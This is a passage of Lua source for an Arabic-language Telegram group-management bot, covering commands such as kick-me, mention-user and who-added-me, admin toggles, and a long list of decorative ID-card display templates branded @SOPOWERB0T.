send(msg.chat_id_, msg.id_,' ⋄تم طردك من الجروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل امر اطردني') 
end
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,' ⋄المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' ⋄لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' ⋄لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⚠| لا اسطيع صيح معرفات الجروبات') 
return false  
end
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
send(msg.chat_id_, msg.id_,' ⋄تعال حبي يصيحونك بل جروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل امر صيح') 
end
return false
end
if string.find(text,"ضافني") or string.find(text,"ضفني") then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' ⋄انت منشئ الجروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' ⋄الشخص الذي قام باضافتك هو »> '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' ⋄انت دخلت عبر الرابط') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل امر ضافني') 
end
end

if text == 'تفعيل ضافني' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر منو ضافني'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر منو ضافني'
else
Text = '\n⋄بالتاكيد تم تعطيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تنزيل جميع الرتب' and BasicConstructor(msg) then  
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⋄تم تنزيل الكل من الرتب الاتيه \n⋄المميزين ، الادمنيه ، المدراء ، المنشئين \n')
end
if text == 'تعطيل صيح' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر صيح'
else
Text = '\n⋄بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' ⋄تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' ⋄بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل امر اطردني'
else
Text = '\n⋄بالتاكيد تم تعطيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"⋄الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ※ عدد صورك ~⪼ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'⋄لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end

if text == 'تغير الايدي' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
local List = {
[[
𖤍 |↶ #id    ꙰🇪🇬.
𖤍 |↶ #username    ꙰🇪🇬.
𖤍 |↶ #msgs    ꙰🇪🇬.
𖤍 |↶ #stast    ꙰🇪🇬.
𖤍 |↶ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 𝗨𝗦𝗘𝗥 ⟿ #username  « 
 𝗠𝗦𝗚𝗦 ⟿  #msgs  « 
 𝗦𝗧𝗔 ⟿ #stast  « 
 𝗜𝗗  ⟿ #id  « 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
🇪🇬≪💎≫ #username • メ
🇪🇬≪💎≫ #stast  •メ
🇪🇬≪💎≫ #id  • メ
🇪🇬≪💎≫ #msgs  •メ
🇪🇬≪💎≫ #game •メ
🇪🇬𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
⌯  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
⌯  𝙸𝙳  𓄹𓄼 #id 
⌯  𝚂𝚃𝙰 𓄹𓄼 #stast 
⌯  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
⌯  𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
𓅓➪ : Iᗪ : #id - ❦ . 
𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
- ايديڪ  ⁞ #id 💘 ٬
- يوزرڪ القميل ⁞ #username 💘 ٬
- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
- رتبتڪ الحلوه ⁞ #stast  💘٬
- سحڪاتڪ الفول ⁞ #edit 💘 ٬
- 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
𓁷 - 𝙞𝙙 †: #id 𓀀 .
𓁷 - 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𖡋 𝐔𝐒𝐄 ⌯ #username 
𖡋 𝐌𝐒𝐆 ⌯ #msgs 
𖡋 𝐒𝐓𝐀 ⌯ #stast 
𖡋 𝐈𝐃 ⌯ #id 
𖡋 𝐄𝐃𝐈𝐓 ⌯ #edit
𖡋 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
𖤂 ~ 𝑚𝑠𝑔 #msgs 𖤐
𖤂 ~ 𝑠𝑡𝑎 #stast  
𖤂 ~ 𝑖𝑑 #id 𖤐
𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
𖤂 ~ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
••• ••• ••• ••• ••• ••• ••• 
࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
 ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
 ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
 ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
••• ••• ••• ••• ••• ••• •••
 ࿕ ¦• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
► 𝗜𝗗 #id 𓃚 ꙰
► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
► 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
-›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
]],
[[
- UsEr🇪🇬 ꙰ #username
- StA🇪🇬 ꙰   #msgs
- MsGs🇪🇬 ꙰ #stast
- ID🇪🇬 ꙰  #id
- 𝗖𝗛 🇪🇬 ꙰  @SOPOWERB0T 💞.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
- 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
ᯓ 𝟔𝟔𝟔𖡋 #game •✟
ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
🦅•𝐮𝐬𝐞𝐫 : #username 𖣬  
🦅•𝐦𝐬𝐠  : #msgs 𖣬 
🦅•𝐬𝐭𝐚 : #stast 𖣬 
🦅•𝐢𝐝  : #id 𖣬
🦅•𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
- ᴜѕʀ: #username ঌ.
- ᴍѕɢ: #msgs  ঌ.
- ѕᴛᴀ: #stast  ঌ.
- ɪᴅ: #id ঌ.
- 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
- 𝑚𝑠𝑔𝑠 ⟿ #msgs
- 𝑖𝑑 ⟿ #id
- 𝑒𝑑𝑖𝑡 ⟿ #edit
- 𝑔𝑎𝑚𝑒 ⟿ #game
- 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
🌯 ¦✙• 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
🌯 ¦✙• 𝒎𝒔𝒈𝒔 ➢ ⁞  #msgs  📝
🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
🌯 ¦✙• 𝒊𝒅 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
🌯 ¦ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
¦• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
➞: 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
➼ : 𝐼𝐷 𖠀 #id . ♡
➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
➼ : 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
▽ ¦⋄• USER ➭ ⁞ #username .
▽ ¦⋄• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
▽ ¦⋄• STAT ➬ ⁞ #stast  .
▽ ¦⋄• 𝙸𝙳  ➬ ⁞ #id  .
▽ ¦⋄• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
• ❉ 𝑺𝑻𝑨 : #stast .
• ❉ 𝑰𝑫 : #id  ‌‌‏.
• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
• ❉ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
⌯ |USERNAME #username 𓃚
⌯ | YOUR -ID - #id 𓃚
⌯ | STAS-#stast 𓃚
 ⌯| MSAG - #msgs 𓃚
 ⌯| 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𝟔𝟔𝟔 𖡋 #username • 𖣰💞
𝟔𝟔𝟔 𖡋  #stast •𖣰💞
𝟔𝟔𝟔 𖡋 #id • 𖣰💞
𝟔𝟔𝟔 𖡋 #game • 𖣰💞
𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
𝟔𝟔𝟔 𖡋 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
🦅 - 𝓾𝓼𝓮𝓻 ➪ #username 🦅.
🦅 - 𝓼𝓽𝓪𝓼𝓽  ➪ #stast 🦅.
🦅 - 𝓲𝓭 ➪ #id ⸙🦅.
🦅 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙🦅.
🦅 - 𝓶𝓼𝓰𝓼 ➪ #msgs 🦅.
🦅 - 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
- 𝄬 username . #username ➪🇪🇬
 - 𝄬 stast . #stast ➪🇪🇬
 - 𝄬 id . #id ➪🇪🇬
 - 𝄬 msgs . #msgs ➪🇪🇬
 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
◣: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➥♡.
◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
◣: 𝒊𝒅 𓂅 #id 𓍯➥♡.
◣: 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
↣• USE ➤ #username  ↝🍬.
↣• MSG ➤  #msgs  ↝🍬.
↣• STA ➤  #stast  ↝🍬.
↣• iD ➤ #id  ↝🍬.
↣• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
➫✿: S #stast 𓍯➟♡.
➫✿: U𓂅 #username 𓍯➟♡.
➫✿: M𓂅 #msgs 𓍯➟♡.
➫✿:  I  #id ➟♡.
➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
✶- 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
• 🖤 | 𝑼𝑬𝑺 :  #username

• 🖤 | 𝑺𝑻𝑨 : #stast

• 🖤 | 𝑰𝑫 :  #id

• 🖤 | 𝑴𝑺𝑮 : #msgs

• 🖤 | 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
• USE 𖦹 #username 
• MSG 𖥳 #msgs  
• STA 𖦹 #stast 
• iD 𖥳 #id
• 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
- ᴅᴇᴛᴀɪʟs ➣ #auto . 
-  ɢᴀᴍᴇ ➣ #game .
- 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
⚕𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 : #msgs
⚕𝙎𝙏𝘼𝙏𝙎 : #stast
⚕𝙄𝘿 : #id
⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
⚕𝘿𝙀𝙑 : #ridha
⚕𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🦄 | 𝑺𝑻𝑨 : #stast ☥
• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
• 🦄 | 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• ▽ | 𝑺𝑻𝑨 : #stast ☥
• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
• ❏ | 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
┇iD ➺ #id 💘
┇UsEr ➺ #username 💕
┇MsG ➺ #msgs 🧸 
┇StAtE ➺ #stast 🎀
┇EdIT ➺ #edit  💒
┇𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🖤 | 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
┄─┉┉◉┉┉─┄
𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇪🇬
𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
✰ ᴄʜ ᴇʟɪɴ ➣ #edit
┄─┉┉◉┉┉─┄
✰ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊
𓄼 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
• ﮼ايديك  #id 🌻 ٬
• ﮼يوزرك ➺ #username 🌻 ٬
• ﮼مسجاتك ➺ #msgs 🌻 ٬
•  ﮼رتبتك➺ #stast 🌻 ٬
• ﮼تعديلك ➺ #edit 🌻 ٬
• ﮼ تعين ➺ @SOPOWERB0T 💞.
]],
[[
‎⿻┊Yor iD 𖠄 #id ٫
‌‎⿻┊UsEr 𖠄 #username ٫
‌‎⿻┊MsGs 𖠄 #msgs ٫
‌‎⿻┊StAtS 𖠄 #stast ٫
‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
‌‎⿻┊‌‎𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
⌾ | 𝒊𝒅  𓃠 #id .
⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
⌾ | 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
♡ : 𝐼𝐷 𖠀 #id .
♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
♡ : 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
•ᑌᔕᗴᖇ- #username 
•ᔕTᗩ- #stast 
•ᗰᔕ- #msgs 
•Iᗪ- #id
•𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
• USE ➤ #username  .
• MSG ➤  #msgs  .
• STA ➤  #stast  .
• iD ➤ #id  .
• 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
𝗖𝗛☤🇪🇬 - @SOPOWERB0T 🦅.
]],
[[
⭐️𝖘𝖙𝖆 : #stast ـ🍭
⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
⭐️𝖎𝖉 : #id ـ 🍭
⭐️𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
• 🇪🇬 - 𝙸𝙳 « #id  🍭
• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
• 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
• USE ➤  #username .
• MSG ➤  #msgs .
• STA ➤  #stast .
• iD ➤ #id .
• 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
𓄼🇪🇬 𝒊𝒅 : #id ‌‌‏⚚
𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
𓄼🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
Usᴇʀ Nᴀᴍᴇ ~ #username 
Yᴏᴜʀ ɪᴅ ~ #id 
Sᴛᴀsᴛ ~ #stast 
Msᴀɢ ~ #msgs
𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
- 🇪🇬 UsErNaMe . #username 𖠲
- 🇪🇬 StAsT . #stast 𖠲
- 🇪🇬 Id . #id 𖠲
- 🇪🇬 GaMeS . #game 𖠲
- 🇪🇬 MsGs . #msgs 𖠲
- 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
🇪🇬 - 𝄬 username . #username  𓃠
🇪🇬 - 𝄬 stast . #stast  𓃠
🇪🇬 - 𝄬 id . #id 𓃠
🇪🇬 - 𝄬 gmas . #gmas 𓃠
🇪🇬 - 𝄬 msgs . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
金 - 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
➜𝗦𝗧𝗔𝗧𝗦 : #stast
➜𝗜𝗗 : #id
➜𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
⌔┇Msgs : #msgs.
⌔┇ID : #id.
⌔┇Stast : #stast.
⌔┇UserName : #username.
⌔┇𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𝒔𝒕𝒂𓂅 #stast 𓍯
𝒖𝒔𝒆𝒓𓂅 #username 𓍯
𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
𝒊𝒅 𓂅 #id 𓍯
𓂅 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
- 🇪🇬 𝒊𝒅 . #id 𖣂.
- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
